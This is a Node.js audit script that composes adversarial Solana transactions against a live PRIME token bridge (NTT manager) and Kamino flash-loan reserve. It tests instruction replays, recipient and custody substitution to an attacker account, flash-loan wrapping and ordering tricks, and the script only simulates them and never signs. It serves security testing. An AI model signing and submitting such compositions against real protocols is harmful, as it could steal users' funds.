#!/usr/bin/env node
'use strict';

// Read-only adversarial transaction composition for the PRIME NTT manager.
// This script constructs real Solana v1 wire transactions and calls only
// simulateTransaction/get* RPC methods. It never signs or submits a transaction.
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const {
  PublicKey, TransactionInstruction, TransactionMessage,
} = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/web3.js');
const anchor = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@coral-xyz/anchor');
const bs58Module = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/bs58');
const bs58 = bs58Module.default || bs58Module;

const OUT = __dirname;
const P = value => new PublicKey(value);
const PROGRAM = P('4T5m5NtRVewiCVzP2mnfeUoMYRqncfkrS21X2dhVCNRT');
const CONFIG = P('BH8E4JJJs3RGWAzQB6AQpzPdmHAGWjffxChatt8Tvi4Q');
const TOKEN_AUTHORITY = P('XcVU4Nhzjzg69VRcpybnoFWT98oQANV58F7guE6mRza');
const CUSTODY = P('7ND1JXFtoH8nn4rvRUvukDwAKgGuJ6uDtFTfTaR9VXiC');
const PRIME = P('3b8X44fLF9ooXaUm3hhSgjpmVs6rZZ3pPoGnGahc3Uu7');
const ATTACKER = P('7UTCbLp2rpj483r91mhEM758LFHBn74GxLTb2SKBYGmH');
const ATTACKER_TOKEN = P('BWCw7fvYpkia1qsEm3ZxA8cRJ7rWzod5BxMK1dcp9vxg');
const RIGHTFUL_TOKEN = P('EGvPQGPJhQbZnjMCBEYPtT8J6gC7r12zxtA5SKLLkkCR');
const TARGET_INBOX = P('2KgyxKGVxAE26QWJmBnM1REAzXj5o99yzs1WdRb3GXjg');
const OTHER_INBOX = P('AJbUkmKGuGaUhPJUNPgaqYkUXH2U29rvT8ewbeTzdZRM');
const MIN_INBOX = P('6CXfZuWFT6xkGc93iyfoFjEEvWcgs9UxrHakAWAEMy6o');
const MAX_INBOX = P('9ymRzurX2jDP7F2XVSKeWGKac626KcJpfF5SMN9gFkRa');
const TARGET_MESSAGE = P('DK6deken2FeaLVbDwzkSjQBwp98pZYuxBDvUbEJSjby6');
const OTHER_MESSAGE = P('Ht52BsFZX7KKRUvvVmhQBWXhZDDApovpnpyvcS27ZhD9');
const TARGET_VAA = P('9CfmvWrL1EBVuYw8N1bu6ugjh9nwzpZrRADtpffNb3bc');
const OTHER_VAA = P('2sZMfPEjZKtBsnYHWaDHxjbT8wt4vsqt9TrMa1tPyTJw');
const RESERVE = P('BUTND9T7Ux4KR8RAEgd4WoZwnP7xA279oA1y3iPVcvSh');
const MARKET = P('CqAoLuqWtavaVE8deBjMKe8ZfSt9ghR6Vb8nfsyabyHA');
const SUPPLY = P('FkSkbRU5A6JXRXo5uaFwCS7jQ6jHYa1DxFtfpXfTz352');
const FEE_VAULT = P('C8zsSvMzpVP4atgHTHQVwmFMer2smzdavQnaK3owTRdB');
const KLEND = P('KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD');
const TOKEN = P('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const SYSTEM = P('11111111111111111111111111111111');
const ASSOCIATED_TOKEN = P('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
const IX_SYSVAR = P('Sysvar1nstructions1111111111111111111111111');
const USDC = P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
const MEMO = P('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
const TARGET_SIGNATURE = '5NAJ7FJSTjscmTRiNSYKh5KdJKCESRAxcQAF45VePoJfjAafW3kR9xgcjy5vugHdnLPZfcszxyBtSMB57CFoFX2D';
const OTHER_SIGNATURE = '45vhvjR5qn8YY62PJYhq4Sks9NSmW4TNe7nfkyeobBQNX5TAbXsoKHTjTP7jWcfV6czPBBNLyLxb8XdMq8nQFjRp';
const OUTBOUND_SIGNATURE = '5FhrDJ5XW77FemaqkFKMmDSiLkR4D454jiVjDcYkoRKgDDvVwbUziyqPV7Nk6MJkze1tqXNUXVSnneWAXW91HKWo';
const EXPECTED_AVAILABLE = 84772939811234n;
const MIN_RECIPIENT_OWNER = P('5mcfpAMophavx1m15v4YYPNUrv4vqErAUzJV7Ct5wr7v');
const MAX_RECIPIENT_OWNER = P('8NVg9LBdWsEnakdzMsAoDo8tif6vJf8ANG3wpCBpzCx8');
const ata = owner => PublicKey.findProgramAddressSync(
  [owner.toBuffer(), TOKEN.toBuffer(), PRIME.toBuffer()], ASSOCIATED_TOKEN)[0];
const MIN_RECIPIENT_TOKEN = ata(MIN_RECIPIENT_OWNER);
const MAX_RECIPIENT_TOKEN = ata(MAX_RECIPIENT_OWNER);

function readEnv(file) {
  return Object.fromEntries(fs.readFileSync(file, 'utf8').split(/\r?\n/)
    .filter(line => /^[A-Za-z_][A-Za-z0-9_]*=/.test(line))
    .map(line => line.split(/=(.*)/s).slice(0, 2)));
}
const env = readEnv('/tmp/composer-helius-rpc.env');
const RPCS = [...new Set([env.HEAVY_RPC_URL, env.RPC_URL].filter(Boolean))];
if (!RPCS.length) throw new Error('RPC_URL/HEAVY_RPC_URL unavailable');

let rpcId = 0;
async function rpc(method, params) {
  const errors = [];
  for (const endpoint of RPCS) {
    try {
      const response = await fetch(endpoint, {method: 'POST', headers: {'content-type': 'application/json'},
        body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params})});
      if (!response.ok) { errors.push(`HTTP ${response.status}`); continue; }
      const body = await response.json();
      if (body.error) { errors.push(`${body.error.code}: ${body.error.message}`); continue; }
      return body.result;
    } catch (error) {
      errors.push(error.message);
    }
  }
  throw new Error(`${method}: all configured RPCs failed (${errors.join('; ')})`);
}

const sha256 = value => crypto.createHash('sha256').update(value).digest('hex');
const disc = name => crypto.createHash('sha256').update(`global:${name}`).digest().subarray(0, 8);
const cloneIx = (ix, changes = {}, data = ix.data) => new TransactionInstruction({
  programId: changes.programId || ix.programId,
  keys: ix.keys.map((key, index) => ({...key, ...(changes[index] || {})})),
  data: Buffer.from(data),
});
const payerIx = ix => cloneIx(ix, {0: {pubkey: ATTACKER, isSigner: true, isWritable: true}});

function accountMap(tx) {
  const message = tx.transaction.message;
  const staticKeys = message.accountKeys.map(key => typeof key === 'string' ? key : key.pubkey);
  const writableLoaded = tx.meta?.loadedAddresses?.writable || [];
  const readonlyLoaded = tx.meta?.loadedAddresses?.readonly || [];
  const all = [...staticKeys, ...writableLoaded, ...readonlyLoaded];
  const header = message.header;
  const signer = index => index < header.numRequiredSignatures;
  const writable = index => index < staticKeys.length
    ? (signer(index)
      ? index < header.numRequiredSignatures - header.numReadonlySignedAccounts
      : index < staticKeys.length - header.numReadonlyUnsignedAccounts)
    : index < staticKeys.length + writableLoaded.length;
  return {message, all, signer, writable};
}

function historicalIx(tx, index) {
  const map = accountMap(tx);
  const source = map.message.instructions[index];
  if (!source) throw new Error(`historical instruction ${index} unavailable`);
  return new TransactionInstruction({
    programId: P(map.all[source.programIdIndex]),
    keys: source.accounts.map(accountIndex => ({pubkey: P(map.all[accountIndex]),
      isSigner: map.signer(accountIndex), isWritable: map.writable(accountIndex)})),
    data: Buffer.from(bs58.decode(source.data)),
  });
}

const marketAuthority = PublicKey.findProgramAddressSync(
  [Buffer.from('lma'), MARKET.toBuffer()], KLEND)[0];
const flashSample = JSON.parse(fs.readFileSync(path.join(OUT, 'kamino-flash-history.json'), 'utf8'))
  .hits[0].transaction;
const sampleBorrow = historicalIx(flashSample, 3);
const sampleRepay = historicalIx(flashSample, 13);
if (!sampleBorrow.programId.equals(KLEND) || !sampleRepay.programId.equals(KLEND))
  throw new Error('Historical KLend flash template changed');

const flashKeys = [
  {pubkey: ATTACKER, isSigner: true, isWritable: true},
  {pubkey: marketAuthority, isSigner: false, isWritable: false},
  {pubkey: MARKET, isSigner: false, isWritable: false},
  {pubkey: RESERVE, isSigner: false, isWritable: true},
  {pubkey: PRIME, isSigner: false, isWritable: false},
  {pubkey: SUPPLY, isSigner: false, isWritable: true},
  {pubkey: ATTACKER_TOKEN, isSigner: false, isWritable: true},
  {pubkey: FEE_VAULT, isSigner: false, isWritable: true},
  {pubkey: KLEND, isSigner: false, isWritable: false},
  {pubkey: KLEND, isSigner: false, isWritable: false},
  {pubkey: IX_SYSVAR, isSigner: false, isWritable: false},
  {pubkey: TOKEN, isSigner: false, isWritable: false},
];
function flashIx(template, amount, borrowInstructionIndex) {
  const data = Buffer.from(template.data);
  data.writeBigUInt64LE(BigInt(amount), 8);
  if (borrowInstructionIndex !== undefined) data[16] = borrowInstructionIndex;
  return new TransactionInstruction({programId: KLEND,
    keys: flashKeys.map(key => ({...key})), data});
}
const borrow = amount => flashIx(sampleBorrow, amount);
const repay = (amount, index) => flashIx(sampleRepay, amount, index);
const versionIx = new TransactionInstruction({programId: PROGRAM, keys: [], data: disc('version')});

// web3.js 1.x can compile account privileges for v1 but does not serialize v1.
// Emit the documented no-ALT v1 wire format, capped at 4,096 bytes.
function encodeV1(instructions, payer, blockhash, computeLimit = 1400000, dataLimit = 67108864) {
  const v0 = new TransactionMessage({payerKey: payer, recentBlockhash: blockhash,
    instructions}).compileToV0Message();
  if (v0.addressTableLookups.length) throw new Error('v1 composition unexpectedly contains ALTs');
  const keys = v0.staticAccountKeys;
  const items = v0.compiledInstructions;
  if (keys.length > 64 || items.length > 64) throw new Error('v1 address/instruction limit exceeded');
  const config = Buffer.alloc(8);
  config.writeUInt32LE(computeLimit, 0);
  config.writeUInt32LE(dataLimit, 4);
  const heads = items.map(ix => {
    const head = Buffer.alloc(4);
    head[0] = ix.programIdIndex;
    head[1] = ix.accountKeyIndexes.length;
    head.writeUInt16LE(ix.data.length, 2);
    return head;
  });
  const payloads = items.map(ix => Buffer.concat([
    Buffer.from(ix.accountKeyIndexes), Buffer.from(ix.data),
  ]));
  const wire = Buffer.concat([
    Buffer.from([0x81, v0.header.numRequiredSignatures,
      v0.header.numReadonlySignedAccounts, v0.header.numReadonlyUnsignedAccounts]),
    Buffer.from([0x0c, 0, 0, 0]),
    Buffer.from(bs58.decode(blockhash)), Buffer.from([items.length, keys.length]),
    ...keys.map(key => key.toBuffer()), config, ...heads, ...payloads,
    Buffer.alloc(64 * v0.header.numRequiredSignatures),
  ]);
  if (wire.length > 4096) throw new Error(`v1 size limit exceeded: ${wire.length}`);
  return {wire, wireBytes: wire.length, addressCount: keys.length,
    instructionCount: items.length, requiredSignatures: v0.header.numRequiredSignatures,
    staticAccounts: keys.map(key => key.toBase58()),
    config: {computeLimit, loadedAccountsDataLimit: dataLimit}};
}

function padTo4096(instructions, payer, blockhash) {
  const emptyMemo = new TransactionInstruction({programId: MEMO, keys: [], data: Buffer.alloc(0)});
  const withEmpty = [...instructions.slice(0, -1), emptyMemo, instructions.at(-1)];
  const emptyLength = encodeV1(withEmpty, payer, blockhash).wireBytes;
  if (emptyLength > 4096) throw new Error(`base exact composition is already ${emptyLength} bytes`);
  const memoLength = 4096 - emptyLength;
  const memo = new TransactionInstruction({programId: MEMO, keys: [],
    data: Buffer.alloc(memoLength, 0x50)});
  const padded = [...instructions.slice(0, -1), memo, instructions.at(-1)];
  const encoded = encodeV1(padded, payer, blockhash);
  if (encoded.wireBytes !== 4096) throw new Error(`exact padding produced ${encoded.wireBytes}`);
  return {instructions: padded, memoBytes: memoLength};
}

const reserveIdl = JSON.parse(fs.readFileSync(
  path.join(OUT, 'marginfi-source/idls-complete/kamino_lending.json'), 'utf8'));
const reserveCoder = new anchor.BorshAccountsCoder(reserveIdl);
const normalize = value => {
  if (value === null || typeof value !== 'object') return value;
  if (value instanceof PublicKey) return value.toBase58();
  if (value.constructor?.name === 'BN') return value.toString();
  if (Array.isArray(value)) return value.map(normalize);
  return Object.fromEntries(Object.entries(value).map(([key, child]) => [key, normalize(child)]));
};

const TRACE = [
  ATTACKER_TOKEN, RIGHTFUL_TOKEN, CUSTODY, SUPPLY, FEE_VAULT, RESERVE, PRIME,
  TARGET_INBOX, OTHER_INBOX, TARGET_MESSAGE, OTHER_MESSAGE, CONFIG,
];
const traceAddresses = TRACE.map(key => key.toBase58());
function accountImage(account, address) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  const base = {owner: account.owner, lamports: String(account.lamports),
    dataLength: data.length, dataSha256: sha256(data)};
  if (account.owner === TOKEN.toBase58() && data.length === 165) return {...base,
    kind: 'splTokenAccount', mint: new PublicKey(data.subarray(0, 32)).toBase58(),
    authority: new PublicKey(data.subarray(32, 64)).toBase58(),
    tokenAmountRaw: data.readBigUInt64LE(64).toString()};
  if (account.owner === TOKEN.toBase58() && data.length === 82) return {...base,
    kind: 'splMint', supplyRaw: data.readBigUInt64LE(36).toString(), decimals: data[44]};
  if (address === RESERVE.toBase58()) {
    try {
      const decoded = normalize(reserveCoder.decode('Reserve', data));
      return {...base, kind: 'klendReserve',
        availableRaw: decoded.liquidity.total_available_amount,
        borrowedAmountSf: decoded.liquidity.borrowed_amount_sf,
        flashLoanFeeSf: decoded.config.fees.flash_loan_fee_sf,
        status: decoded.config.status};
    } catch (error) {
      return {...base, kind: 'klendReserve', decodeError: error.message};
    }
  }
  return {...base, kind: 'opaque'};
}
const image = (accounts, addresses = traceAddresses) => {
  const observed = Object.fromEntries(addresses.map((address, index) =>
    [address, accountImage(accounts?.[index], address)]));
  return Object.fromEntries(traceAddresses.map(address =>
    [address, Object.prototype.hasOwnProperty.call(observed, address) ? observed[address] : null]));
};
const numberDelta = (before, after, field) => {
  const a = before?.[field];
  const b = after?.[field];
  return a === undefined || b === undefined || a === null || b === null
    ? null : (BigInt(b) - BigInt(a)).toString();
};
function deltas(before, after) {
  return Object.fromEntries(traceAddresses.map(address => {
    const a = before[address];
    const b = after[address];
    const field = a?.tokenAmountRaw !== undefined ? 'tokenAmountRaw'
      : a?.supplyRaw !== undefined ? 'supplyRaw'
      : a?.availableRaw !== undefined ? 'availableRaw' : null;
    return [address, {observed: b !== null, field, deltaRaw: field ? numberDelta(a, b, field) : null,
      borrowedAmountSfDelta: a?.borrowedAmountSf !== undefined && b?.borrowedAmountSf !== undefined
        ? numberDelta(a, b, 'borrowedAmountSf') : null,
      dataChanged: a && b ? a.dataSha256 !== b.dataSha256 : null,
      lamportsDelta: a && b ? (BigInt(b.lamports) - BigInt(a.lamports)).toString() : null}];
  }));
}

function blueprint(instructions) {
  return instructions.map((ix, index) => ({index, programId: ix.programId.toBase58(),
    dataHex: ix.data.toString('hex'), dataLength: ix.data.length,
    accounts: ix.keys.map(key => ({pubkey: key.pubkey.toBase58(),
      signer: key.isSigner, writable: key.isWritable}))}));
}

async function simulate(label, instructions, payer, blockhash, before, metadata = {}) {
  const encoded = encodeV1(instructions, payer, blockhash);
  // The v1 RPC currently bounds returned account images by the transaction's
  // static-account count. Prioritize the outsider and value-bearing accounts.
  const requestedTrace = traceAddresses.slice(0, encoded.addressCount);
  const request = {jsonrpc: '2.0', id: ++rpcId, method: 'simulateTransaction', params: [
    encoded.wire.toString('base64'), {encoding: 'base64', sigVerify: false,
      replaceRecentBlockhash: true, commitment: 'confirmed',
      accounts: {encoding: 'base64', addresses: requestedTrace}},
  ]};
  let responseBody = null;
  const transportErrors = [];
  for (const endpoint of RPCS) {
    try {
      const response = await fetch(endpoint, {method: 'POST', headers: {'content-type': 'application/json'},
        body: JSON.stringify(request)});
      if (!response.ok) { transportErrors.push(`HTTP ${response.status}`); continue; }
      const body = await response.json();
      if (body.error) { transportErrors.push(`${body.error.code}: ${body.error.message}`); continue; }
      responseBody = body;
      break;
    } catch (error) {
      transportErrors.push(error.message);
    }
  }
  if (!responseBody) return {label, transportError: transportErrors.join('; '), ...metadata,
    wireBytes: encoded.wireBytes, wireSha256: sha256(encoded.wire), blueprint: blueprint(instructions)};
  const value = responseBody.result?.value;
  const post = image(value?.accounts, requestedTrace);
  const stateDeltas = deltas(before, post);
  const attackerDelta = stateDeltas[ATTACKER_TOKEN.toBase58()]?.deltaRaw;
  const committed = value?.err === null;
  const flashLiability = committed && metadata.containsFlashBorrow && !metadata.containsFlashRepay
    ? String(metadata.flashAmountRaw) : '0';
  const outsiderNet = !committed ? '0' : attackerDelta === null ? null
    : (BigInt(attackerDelta) - BigInt(flashLiability)).toString();
  return {label, ...metadata, slot: responseBody.result?.context?.slot,
    transportError: null, err: value?.err ?? null, committed,
    wireVersion: 1, wireBytes: encoded.wireBytes, wireSha256: sha256(encoded.wire),
    wireBase64: encoded.wire.toString('base64'), addressCount: encoded.addressCount,
    instructionCount: encoded.instructionCount, requiredSignatures: encoded.requiredSignatures,
    staticAccounts: encoded.staticAccounts, config: encoded.config,
    unitsConsumed: value?.unitsConsumed ?? null,
    loadedAccountsDataSize: value?.loadedAccountsDataSize ?? null,
    returnedAccountAddresses: requestedTrace,
    returnData: value?.returnData || null, stateDeltas,
    accounting: {attackerPrimeDeltaRaw: committed ? attackerDelta : '0',
      outstandingFlashLiabilityRaw: flashLiability, outsiderNetPrimeRaw: outsiderNet,
      positiveOutsiderNetEquity: outsiderNet !== null && BigInt(outsiderNet) > 0n},
    logs: (value?.logs || []).filter(line => /Instruction:|Program log:|failed|success|Error|error/i.test(line)),
    blueprint: blueprint(instructions)};
}

async function main() {
  const targetTx = JSON.parse(fs.readFileSync(path.join(OUT,
    'prime-second-exit-transaction.raw.json'), 'utf8'));
  const [otherTx, outboundTx, latest, pre] = await Promise.all([
    rpc('getTransaction', [OTHER_SIGNATURE,
      {encoding: 'json', commitment: 'finalized', maxSupportedTransactionVersion: 1}]),
    rpc('getTransaction', [OUTBOUND_SIGNATURE,
      {encoding: 'json', commitment: 'finalized', maxSupportedTransactionVersion: 1}]),
    rpc('getLatestBlockhash', [{commitment: 'confirmed'}]),
    rpc('getMultipleAccounts', [traceAddresses, {encoding: 'base64', commitment: 'confirmed'}]),
  ]);
  if (!otherTx || !outboundTx) throw new Error('Required historical control transaction unavailable');
  const blockhash = latest.value.blockhash;
  const before = image(pre.value);
  if (before[RESERVE.toBase58()]?.availableRaw !== EXPECTED_AVAILABLE.toString())
    throw new Error(`PRIME reserve snapshot changed from ${EXPECTED_AVAILABLE}`);
  if (before[ATTACKER_TOKEN.toBase58()]?.mint !== PRIME.toBase58() ||
      before[ATTACKER_TOKEN.toBase58()]?.authority !== ATTACKER.toBase58())
    throw new Error('Attacker control token account identity changed');
  if (!marketAuthority.equals(P('9SLBVnPz8dRGvafST6zNBZYSSt3HtdU68XQLGR13t3uM')))
    throw new Error('KLend market authority derivation mismatch');

  const receiveTarget = payerIx(historicalIx(targetTx, 0));
  const redeemTarget = payerIx(historicalIx(targetTx, 1));
  const releaseTarget = payerIx(historicalIx(targetTx, 2));
  const receiveOther = payerIx(historicalIx(otherTx, 3));
  const redeemOther = payerIx(historicalIx(otherTx, 4));
  const releaseOther = payerIx(historicalIx(otherTx, 5));
  const outboundLock = historicalIx(outboundTx, 1);

  for (const [ix, discriminator, name] of [
    [receiveTarget, '86d58f44eb66e860', 'receiveWormholeMessage'],
    [redeemTarget, 'b80c569546c461e1', 'redeem'],
    [releaseTarget, 'b6a23ecec5895362', 'releaseInboundUnlock'],
  ]) if (ix.data.subarray(0, 8).toString('hex') !== discriminator)
    throw new Error(`${name} historical discriminator mismatch`);

  const onePrime = 1_000_000n;
  const nearCapacity = EXPECTED_AVAILABLE * 99n / 100n;
  const flashSpecs = [
    ['flash_dust_1_raw_repay', 1n],
    ['flash_1_prime_repay', onePrime],
    ['flash_99_percent_available_repay', nearCapacity],
    ['flash_full_available_repay', EXPECTED_AVAILABLE],
    ['flash_available_plus_1_repay', EXPECTED_AVAILABLE + 1n],
  ].map(([label, amount]) => ({label, instructions: [borrow(amount), repay(amount, 0)],
    metadata: {category: 'klend-boundary', containsFlashBorrow: true,
      containsFlashRepay: true, flashAmountRaw: amount.toString()}}));

  const compositionAmount = onePrime;
  const composition = [borrow(compositionAmount), versionIx, repay(compositionAmount, 0)];
  const exact = padTo4096(composition, ATTACKER, blockhash);
  const exactReleaseReplay = padTo4096(
    [borrow(compositionAmount), releaseTarget, repay(compositionAmount, 0)], ATTACKER, blockhash);
  const specs = [
    {label: 'target_version_control', instructions: [versionIx],
      metadata: {category: 'target-control'}},
    ...flashSpecs,
    {label: 'flash_target_version_repay', instructions: composition,
      metadata: {category: 'target-klend-composition', containsFlashBorrow: true,
        containsFlashRepay: true, flashAmountRaw: compositionAmount.toString()}},
    {label: 'exact_4096_flash_target_version_repay', instructions: exact.instructions,
      metadata: {category: 'exact-v1-capacity', containsFlashBorrow: true,
        containsFlashRepay: true, flashAmountRaw: compositionAmount.toString(),
        paddingMemoBytes: exact.memoBytes, requiredExactWireBytes: 4096}},
    {label: 'exact_4096_flash_release_replay_repay', instructions: exactReleaseReplay.instructions,
      metadata: {category: 'exact-v1-adversarial-replay', containsFlashBorrow: true,
        containsFlashRepay: true, flashAmountRaw: compositionAmount.toString(),
        paddingMemoBytes: exactReleaseReplay.memoBytes, requiredExactWireBytes: 4096}},

    {label: 'release_replay_original_recipient', instructions: [releaseTarget],
      metadata: {category: 'release-replay'}},
    {label: 'release_recipient_substitution_to_attacker',
      instructions: [cloneIx(releaseTarget, {3: {pubkey: ATTACKER_TOKEN}})],
      metadata: {category: 'release-account-substitution'}},
    {label: 'release_other_inbox_target_recipient',
      instructions: [cloneIx(releaseTarget, {2: {pubkey: OTHER_INBOX}})],
      metadata: {category: 'release-account-substitution'}},
    {label: 'release_other_inbox_matching_attacker_recipient_replay', instructions: [releaseOther],
      metadata: {category: 'release-replay'}},
    {label: 'release_token_authority_substitution',
      instructions: [cloneIx(releaseTarget, {4: {pubkey: marketAuthority}})],
      metadata: {category: 'release-account-substitution'}},
    {label: 'release_custody_substitution',
      instructions: [cloneIx(releaseTarget, {7: {pubkey: SUPPLY}})],
      metadata: {category: 'release-account-substitution'}},
    {label: 'release_mint_substitution',
      instructions: [cloneIx(releaseTarget, {5: {pubkey: USDC}})],
      metadata: {category: 'release-account-substitution'}},
    {label: 'release_token_program_substitution',
      instructions: [cloneIx(releaseTarget, {6: {pubkey: SYSTEM}})],
      metadata: {category: 'release-account-substitution'}},
    {label: 'release_config_substitution',
      instructions: [cloneIx(releaseTarget, {1: {pubkey: SYSTEM}})],
      metadata: {category: 'release-account-substitution'}},
    {label: 'release_payer_not_signer',
      instructions: [cloneIx(releaseTarget, {0: {pubkey: P('B3fKwFboee4XZDVJNzJcVo7ms9W8VwYwmQ2gSojLCMR9'),
        isSigner: false, isWritable: true}})], metadata: {category: 'signer-check'}},
    {label: 'release_minimum_claim_to_attacker',
      instructions: [cloneIx(releaseTarget, {2: {pubkey: MIN_INBOX}, 3: {pubkey: ATTACKER_TOKEN}})],
      metadata: {category: 'claim-boundary', claimAmountRaw: '100000'}},
    {label: 'release_maximum_claim_to_attacker',
      instructions: [cloneIx(releaseTarget, {2: {pubkey: MAX_INBOX}, 3: {pubkey: ATTACKER_TOKEN}})],
      metadata: {category: 'claim-boundary', claimAmountRaw: '211517120000'}},
    {label: 'release_minimum_claim_matching_recipient_replay',
      instructions: [cloneIx(releaseTarget, {2: {pubkey: MIN_INBOX},
        3: {pubkey: MIN_RECIPIENT_TOKEN}})],
      metadata: {category: 'claim-boundary-replay', claimAmountRaw: '100000',
        recipientOwner: MIN_RECIPIENT_OWNER.toBase58(),
        recipientToken: MIN_RECIPIENT_TOKEN.toBase58()}},
    {label: 'release_maximum_claim_matching_recipient_replay',
      instructions: [cloneIx(releaseTarget, {2: {pubkey: MAX_INBOX},
        3: {pubkey: MAX_RECIPIENT_TOKEN}})],
      metadata: {category: 'claim-boundary-replay', claimAmountRaw: '211517120000',
        recipientOwner: MAX_RECIPIENT_OWNER.toBase58(),
        recipientToken: MAX_RECIPIENT_TOKEN.toBase58()}},

    {label: 'redeem_replay', instructions: [redeemTarget], metadata: {category: 'redeem-replay'}},
    {label: 'redeem_other_message_target_inbox',
      instructions: [cloneIx(redeemTarget, {3: {pubkey: OTHER_MESSAGE}})],
      metadata: {category: 'redeem-account-substitution'}},
    {label: 'redeem_target_message_other_inbox',
      instructions: [cloneIx(redeemTarget, {6: {pubkey: OTHER_INBOX}})],
      metadata: {category: 'redeem-account-substitution'}},
    {label: 'redeem_peer_substitution',
      instructions: [cloneIx(redeemTarget, {2: {pubkey: CONFIG}})],
      metadata: {category: 'redeem-account-substitution'}},
    {label: 'redeem_transceiver_substitution',
      instructions: [cloneIx(redeemTarget, {4: {pubkey: CONFIG}})],
      metadata: {category: 'redeem-account-substitution'}},
    {label: 'redeem_mint_substitution',
      instructions: [cloneIx(redeemTarget, {5: {pubkey: USDC}})],
      metadata: {category: 'redeem-account-substitution'}},

    {label: 'receive_replay', instructions: [receiveTarget], metadata: {category: 'receive-replay'}},
    {label: 'receive_other_vaa_target_message',
      instructions: [cloneIx(receiveTarget, {3: {pubkey: OTHER_VAA}})],
      metadata: {category: 'receive-account-substitution'}},
    {label: 'receive_target_vaa_other_message',
      instructions: [cloneIx(receiveTarget, {4: {pubkey: OTHER_MESSAGE}})],
      metadata: {category: 'receive-account-substitution'}},
    {label: 'receive_peer_substitution',
      instructions: [cloneIx(receiveTarget, {2: {pubkey: CONFIG}})],
      metadata: {category: 'receive-account-substitution'}},
    {label: 'receive_config_substitution',
      instructions: [cloneIx(receiveTarget, {1: {pubkey: SYSTEM}})],
      metadata: {category: 'receive-account-substitution'}},

    {label: 'receive_redeem_release_replay',
      instructions: [receiveTarget, redeemTarget, releaseTarget],
      metadata: {category: 'same-transaction-ordering'}},
    {label: 'release_redeem_receive_wrong_order',
      instructions: [releaseTarget, redeemTarget, receiveTarget],
      metadata: {category: 'same-transaction-ordering'}},
    {label: 'flash_receive_redeem_release_replay_repay',
      instructions: [borrow(onePrime), receiveTarget, redeemTarget, releaseTarget, repay(onePrime, 0)],
      metadata: {category: 'flash-target-ordering', containsFlashBorrow: true,
        containsFlashRepay: true, flashAmountRaw: onePrime.toString()}},
    {label: 'flash_release_redeem_receive_wrong_order_repay',
      instructions: [borrow(onePrime), releaseTarget, redeemTarget, receiveTarget, repay(onePrime, 0)],
      metadata: {category: 'flash-target-ordering', containsFlashBorrow: true,
        containsFlashRepay: true, flashAmountRaw: onePrime.toString()}},

    {label: 'outbound_transfer_lock_replay', instructions: [outboundLock],
      metadata: {category: 'outbound-replay', historicalAmountRaw: '3530048916'}},
    {label: 'outbound_transfer_lock_from_attacker_without_session_delegate',
      instructions: [cloneIx(outboundLock, {0: {pubkey: ATTACKER, isSigner: true},
        3: {pubkey: ATTACKER_TOKEN}})],
      metadata: {category: 'outbound-source-authorization', historicalAmountRaw: '3530048916'}},
  ];

  const results = [];
  for (const spec of specs) {
    try {
      const result = await simulate(spec.label, spec.instructions, ATTACKER, blockhash, before,
        spec.metadata || {});
      results.push(result);
      console.log(JSON.stringify({label: result.label, err: result.err,
        transportError: result.transportError, wireBytes: result.wireBytes,
        unitsConsumed: result.unitsConsumed, accounting: result.accounting,
        finalLog: result.logs?.at(-1) || null}));
    } catch (error) {
      results.push({label: spec.label, localError: error.stack, metadata: spec.metadata || {}});
      console.log(JSON.stringify({label: spec.label, localError: error.message}));
    }
  }

  const positive = results.filter(result => result.accounting?.positiveOutsiderNetEquity);
  const output = {
    generatedAt: new Date().toISOString(),
    rpc: 'configured authenticated Solana RPC (URL redacted)',
    methodsUsed: ['getTransaction', 'getLatestBlockhash', 'getMultipleAccounts', 'simulateTransaction'],
    noTransactionsSubmitted: true, sigVerify: false, replaceRecentBlockhash: true,
    scope: {programId: PROGRAM.toBase58(), config: CONFIG.toBase58(), mint: PRIME.toBase58(),
      tokenAuthority: TOKEN_AUTHORITY.toBase58(), custody: CUSTODY.toBase58(),
      reserve: RESERVE.toBase58(), market: MARKET.toBase58(), marketAuthority: marketAuthority.toBase58(),
      supplyVault: SUPPLY.toBase58(), feeVault: FEE_VAULT.toBase58(),
      attacker: ATTACKER.toBase58(), attackerToken: ATTACKER_TOKEN.toBase58()},
    sourceTransactions: {targetExit: TARGET_SIGNATURE, otherInbound: OTHER_SIGNATURE,
      outbound: OUTBOUND_SIGNATURE},
    preContextSlot: pre.context.slot, preState: before,
    reserveBoundaryRaw: {observedAvailable: EXPECTED_AVAILABLE.toString(),
      nearCapacity99Percent: nearCapacity.toString(), overCapacity: (EXPECTED_AVAILABLE + 1n).toString()},
    resultCount: results.length, successfulCount: results.filter(result => result.committed).length,
    failedCount: results.filter(result => result.committed === false).length,
    transportOrLocalFailureCount: results.filter(result => result.transportError || result.localError).length,
    positiveOutsiderNetEquityCount: positive.length,
    validatedFinding: positive.length ? 'requires manual validation' : null,
    results,
  };
  const outputPath = path.join(OUT, 'prime-second-adversarial-v1.json');
  fs.writeFileSync(outputPath, `${JSON.stringify(output, null, 2)}\n`);
  console.log(JSON.stringify({outputPath, resultCount: results.length,
    successfulCount: output.successfulCount, positiveOutsiderNetEquityCount: positive.length}));
}

if (require.main === module) main().catch(error => {
  console.error(error.stack);
  process.exitCode = 1;
});

module.exports = {encodeV1, padTo4096};
